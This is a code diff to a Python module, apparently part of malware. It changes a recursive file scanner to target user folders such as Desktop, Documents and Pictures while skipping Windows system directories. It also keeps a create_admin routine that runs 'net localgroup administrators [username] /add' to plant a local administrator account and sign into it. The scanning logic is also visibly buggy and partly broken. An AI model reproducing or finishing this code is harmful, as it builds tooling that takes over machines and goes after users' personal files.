@@ -44,13 +44,19 @@ class Ptime():
 class functions():
 
   @staticmethod
-  def scanfolder(baseDir):
+  def scanfolder(baseDir, safe=None):
     files = []
+    safeFiles = ['C:/Users/Desktop','C:/Users/Documents','C:/Users/Pictures']
+    # Confirm these folders need admin perms to tamper with
+    badFiles = ['C:/Windows','C:/Program Files','C:/Program Files (x86)']
     for r, d, f in os.walk(baseDir):
       for file in f:
         filepath = os.path.join(r, file)
       if os.path.exists(filepath):
         files.append(filepath)
+        for item in badFiles, safeFiles:
+            if item in files:
+              files.remove(item)
 
     return files
 
@@ -61,7 +67,7 @@ class functions():
 
   @staticmethod
   def create_admin():
-    # Creates a local admin and attempts to sign into it
+    # Creates a local admin and attempts to sign into it(in sub-function)
 
     # METHOD 1
     os.system('net localgroup administrators [username] /add')
@@ -145,13 +151,12 @@ Loop
 
     def scanrecurse(baseDir):
       files = []
-      restrictedFiles = ['Windows', 'Program Files', 'Program Files (x86)']
       for r, d, f in os.walk(baseDir):
         for file in f:
           filepath = os.path.join(r, file)
         if os.path.exists(filepath):
           files.append(os.path.join(r, file))
-          for item in restrictedFiles:
+          for item in badFiles:
             if item in files:
               files.remove(item)
               
